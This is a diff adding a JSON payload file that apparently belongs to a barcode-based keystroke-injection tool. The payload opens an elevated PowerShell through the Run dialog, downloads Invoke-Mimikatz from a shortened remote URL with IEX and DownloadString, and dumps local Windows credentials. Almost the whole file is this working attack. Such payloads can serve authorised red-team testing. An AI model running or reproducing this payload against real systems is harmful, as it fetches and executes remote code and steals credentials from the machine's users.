@@ -1,0 +1,17 @@
+{
+  "name": "Invoke-Mimikatz Dump Creds",
+  "description": "Opens PowerShell as admin, then downloads Invoke-Mimikatz and dumps local creds",
+  "symbology": "pdf417",
+  "bwippoptions": "columns=2",
+
+  "setup-dependencies": [
+    "run-win-r",
+    "map-enter"
+  ],
+
+  "payload": [
+    "`02powershell start-process -verb runas powershell.exe",
+    "`04",
+    "`05IEX (New-Object Net.WebClient).DownloadString('http://j.mp/2lK9zHD');Invoke-Mimikatz -DumpCreds"
+  ]
+}
